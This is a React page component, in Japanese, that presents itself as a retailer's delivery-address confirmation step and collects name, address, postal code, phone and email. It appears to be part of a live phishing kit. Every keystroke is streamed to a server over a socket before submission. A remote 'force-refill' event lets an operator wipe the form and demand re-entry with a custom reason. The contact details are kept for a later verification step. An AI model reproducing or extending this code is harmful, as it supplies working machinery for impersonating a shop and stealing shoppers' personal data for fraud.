import { useEffect, useRef, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { socket } from '../socket';
import { useCurrentPage } from '../hooks/useCurrentPage';
import { clearDraft, loadDraft, saveDraft, STORAGE_KEYS } from '../session';
import { BRAND, BRAND_PROMISES } from '../brand';

type Form = {
  fullname: string;
  address: string;
  fulladdress: string;
  city: string;
  state: string;
  postalcode: string;
  email: string;
  telephone: string;
};

const EMPTY_FORM: Form = {
  fullname: '',
  address: '',
  fulladdress: '',
  city: '',
  state: '',
  postalcode: '',
  email: '',
  telephone: '',
};

function loadInfoFormDraft() {
  const raw = loadDraft<Partial<Form> | null>(STORAGE_KEYS.infoDraft, null);
  if (!raw || typeof raw !== 'object') return EMPTY_FORM;
  return {
    fullname: (raw.fullname || '').toString(),
    address: (raw.address || '').toString(),
    fulladdress: (raw.fulladdress || '').toString(),
    city: (raw.city || '').toString(),
    state: (raw.state || '').toString(),
    postalcode: (raw.postalcode || '').toString(),
    email: (raw.email || '').toString(),
    telephone: (raw.telephone || '').toString(),
  };
}

const LABEL: Record<keyof Form, string> = {
  fullname: 'お名前',
  address: '住所',
  fulladdress: '建物名・部屋番号',
  city: '市区町村',
  state: '都道府県',
  postalcode: '郵便番号',
  email: 'メールアドレス',
  telephone: '電話番号',
};

const REQUIRED: Array<keyof Form> = ['fullname', 'address', 'city', 'state', 'postalcode', 'email', 'telephone'];

function isEmail(x: string) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(x.trim());
}

function normalizePhone(x: string) {
  const trimmed = x.trim();
  const plus = trimmed.startsWith('+') ? '+' : '';
  const digits = trimmed.replace(/[^\d]/g, '');
  return (plus + digits).slice(0, 20);
}

type RefillPayload = { reason?: string; recordId?: string };

export default function Info() {
  useCurrentPage('info');
  const navigate = useNavigate();

  const [form, setForm] = useState<Form>(() => loadInfoFormDraft());
  const [status, setStatus] = useState('この注文に登録する配送先情報を入力してください。');
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState<Partial<Record<keyof Form, string>>>({});

  const inputRefs = useRef<Partial<Record<keyof Form, HTMLInputElement | null>>>({});
  const typingTimers = useRef<Partial<Record<keyof Form, ReturnType<typeof setTimeout>>>>({});

  useEffect(() => {
    socket.emit('join-page', 'info');
    const hasDraft = Object.values(form).some((v) => v.trim());
    setStatus(hasDraft ? '保存済みの入力内容を復元しました。' : 'この注文に登録する配送先情報を入力してください。');
  }, []);

  useEffect(() => {
    saveDraft(STORAGE_KEYS.infoDraft, form);
  }, [form]);

  useEffect(() => {
    const hasDraft = Object.values(form).some((v) => v.trim());
    if (!hasDraft) return;
    const timer = setTimeout(() => {
      (Object.keys(form) as Array<keyof Form>).forEach((key) => {
        const value = form[key];
        if (!value) return;
        socket.emit('update-form-field', { field: key, value });
      });
    }, 180);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    const handleForceRefill = (payload?: RefillPayload) => {
      setForm(EMPTY_FORM);
      clearDraft(STORAGE_KEYS.infoDraft);
      setErrors({});
      setLoading(false);

      setStatus(payload?.reason ? `再入力依頼: ${payload.reason}` : 'この注文の配送先情報を確認のうえ、もう一度入力してください。');
      navigate('/info', { replace: true });
      window.scrollTo({ top: 0, behavior: 'smooth' });
      setTimeout(() => inputRefs.current.fullname?.focus(), 0);
    };

    socket.on('force-refill', handleForceRefill);
    return () => {
      socket.off('force-refill', handleForceRefill);
    };
  }, [navigate]);

  const scheduleEmit = (field: keyof Form, value: string) => {
    const t = typingTimers.current[field];
    if (t) clearTimeout(t);
    typingTimers.current[field] = setTimeout(() => {
      socket.emit('update-form-field', { field, value });
    }, 180);
  };

  const validateAll = (next: Form) => {
    const e: Partial<Record<keyof Form, string>> = {};
    for (const k of REQUIRED) {
      if (!next[k].trim()) e[k] = `${LABEL[k]} is required.`;
    }
    if (next.email && !isEmail(next.email)) e.email = '有効なメールアドレスを入力してください。';
    const phoneDigits = normalizePhone(next.telephone).replace(/\D/g, '');
    if (next.telephone && phoneDigits.length > 0 && phoneDigits.length < 7) e.telephone = '電話番号が短すぎます。';
    return e;
  };

  const validateField = (name: keyof Form, value: string) => {
    if (REQUIRED.includes(name) && !value.trim()) return `${LABEL[name]} is required.`;
    if (name === 'email' && value && !isEmail(value)) return '有効なメールアドレスを入力してください。';
    if (name === 'telephone' && value) {
      const phoneDigits = normalizePhone(value).replace(/\D/g, '');
      if (phoneDigits.length > 0 && phoneDigits.length < 7) return '電話番号が短すぎます。';
    }
    return undefined;
  };

  const setField = (name: keyof Form, raw: string) => {
    const value = name === 'telephone' ? normalizePhone(raw) : raw;
    setForm((prev) => {
      const next = { ...prev, [name]: value };
      setErrors((old) => {
        const nextErrors = { ...old };
        const msg = validateField(name, value);
        if (msg) nextErrors[name] = msg;
        else delete nextErrors[name];
        return nextErrors;
      });
      return next;
    });
    scheduleEmit(name, value);
    setStatus(`入力中: ${LABEL[name]}`);
  };

  const focusFirstError = (e: Partial<Record<keyof Form, string>>) => {
    for (const k of REQUIRED) {
      if (e[k]) {
        inputRefs.current[k]?.focus();
        return;
      }
    }
  };

  const handleSubmit = () => {
    if (loading) return;
    const e = validateAll(form);
    setErrors(e);
    if (Object.keys(e).length > 0) {
      setStatus('赤い項目を確認して、もう一度お試しください。');
      setTimeout(() => focusFirstError(e), 0);
      return;
    }

    setLoading(true);
    setStatus('配送先情報を保存しています...');
    clearDraft(STORAGE_KEYS.infoDraft);
    saveDraft(STORAGE_KEYS.verifyContact, {
      telephone: form.telephone.trim(),
      email: form.email.trim(),
    });
    socket.emit('update-user-info', { ...form });
    setTimeout(() => navigate('/checkout'), 450);
  };

  const inputClass = (name: keyof Form) =>
    ['alz-input placeholder:text-slate-400', errors[name] ? 'border-red-500/60 !shadow-[0_0_0_3px_rgba(239,68,68,0.12)]' : ''].join(' ');

  const ErrorText = ({ name }: { name: keyof Form }) => (
    errors[name] ? <p className="mt-2 text-sm text-red-500 leading-snug">{errors[name]}</p> : null
  );

  return (
    <div className="alz-page">
      <div className="alz-shell">
        <div className="alz-top">
          <div className="alz-step-head">
            <div>
              <h1 className="alz-step-title">配送先住所を確認</h1>
              <p className="alz-step-subtitle">この注文に登録する配送情報をご確認ください。</p>
            </div>
          </div>
          <div className="alz-track mt-3">
            <span style={{ width: '34%' }} />
          </div>
        </div>

        <div className="alz-flow-grid">
          <div className="alz-card">
            <div className="alz-section-eyebrow">配送先情報</div>
            <h2 className="alz-page-title">お届け先情報を確認してください</h2>
            <p className="alz-page-copy">{status}</p>
            <div className="alz-brand-row mb-2">
              {BRAND_PROMISES.map((item) => (
                <span key={item} className="alz-brand-pill">{item}</span>
              ))}
            </div>

            <form
              className="space-y-5 mt-5"
              onSubmit={(e) => {
                e.preventDefault();
                handleSubmit();
              }}
            >
              <div>
                <label className="alz-field-label">氏名</label>
                <input ref={(el) => (inputRefs.current.fullname = el)} value={form.fullname} onChange={(e) => setField('fullname', e.target.value)} className={inputClass('fullname')} placeholder="山田 太郎 *" autoComplete="name" enterKeyHint="next" />
                <ErrorText name="fullname" />
              </div>
              <div>
                <label className="alz-field-label">住所</label>
                <input ref={(el) => (inputRefs.current.address = el)} value={form.address} onChange={(e) => setField('address', e.target.value)} className={inputClass('address')} placeholder="千代田1-1-1 *" autoComplete="address-line1" enterKeyHint="next" />
                <ErrorText name="address" />
              </div>
              <div>
                <label className="alz-field-label">建物名・部屋番号など</label>
                <input ref={(el) => (inputRefs.current.fulladdress = el)} value={form.fulladdress} onChange={(e) => setField('fulladdress', e.target.value)} className={inputClass('fulladdress')} placeholder="〇〇マンション 101号室（任意）" autoComplete="address-line2" enterKeyHint="next" />
                <ErrorText name="fulladdress" />
              </div>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                <div>
                  <label className="alz-field-label">市区町村</label>
                  <input ref={(el) => (inputRefs.current.city = el)} value={form.city} onChange={(e) => setField('city', e.target.value)} className={inputClass('city')} placeholder="千代田区 *" autoComplete="address-level2" enterKeyHint="next" />
                  <ErrorText name="city" />
                </div>
                <div>
                  <label className="alz-field-label">都道府県</label>
                  <input ref={(el) => (inputRefs.current.state = el)} value={form.state} onChange={(e) => setField('state', e.target.value)} className={inputClass('state')} placeholder="東京都 *" autoComplete="address-level1" enterKeyHint="next" />
                  <ErrorText name="state" />
                </div>
              </div>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                <div>
                  <label className="alz-field-label">郵便番号</label>
                  <input ref={(el) => (inputRefs.current.postalcode = el)} value={form.postalcode} onChange={(e) => setField('postalcode', e.target.value)} className={inputClass('postalcode')} placeholder="1000001 *" autoComplete="postal-code" inputMode="numeric" enterKeyHint="next" />
                  <ErrorText name="postalcode" />
                </div>
                <div>
                  <label className="alz-field-label">電話番号</label>
                  <input ref={(el) => (inputRefs.current.telephone = el)} value={form.telephone} onChange={(e) => setField('telephone', e.target.value)} className={inputClass('telephone')} placeholder="09012345678 *" autoComplete="tel" inputMode="tel" enterKeyHint="next" />
                  <ErrorText name="telephone" />
                </div>
              </div>
              <div>
                <label className="alz-field-label">メールアドレス</label>
                <input ref={(el) => (inputRefs.current.email = el)} value={form.email} onChange={(e) => setField('email', e.target.value)} className={inputClass('email')} placeholder="example@example.jp *" autoComplete="email" inputMode="email" enterKeyHint="done" />
                <ErrorText name="email" />
              </div>

              <button type="submit" disabled={loading} className="alz-btn-primary mt-2 text-lg sm:text-xl md:text-2xl">
                {loading ? '保存中...' : '住所を確認する'}
              </button>
              <p className="alz-helper-copy text-center mt-3">
                アカウント情報に変更があった場合、これらの内容を再度確認していただくことがあります。
              </p>
            </form>

            <div className="text-[11px] text-center text-[#565959] mt-1">{BRAND.legal}</div>
          </div>

          <aside className="alz-card alz-flow-aside alz-side-summary">
            <div className="alz-side-summary-title">配送先情報</div>
            <div className="alz-order-mini-card">
              <div className="alz-order-mini-thumb" />
              <div>
                <div className="alz-order-mini-title">登録済みの配送先住所を確認</div>
                <div className="alz-order-mini-copy">お届け先氏名、住所、郵便番号、連絡先を確認してください。</div>
              </div>
            </div>
            <div className="alz-side-summary-list">
              <div>受取人氏名</div>
              <div>住所と郵便番号</div>
              <div>電話番号とメールアドレス</div>
            </div>
            <div className="alz-side-summary-box">この注文に登録する配送先情報を使って、発送手続きを続行します。</div>
          </aside>
        </div>
      </div>
    </div>
  );
}
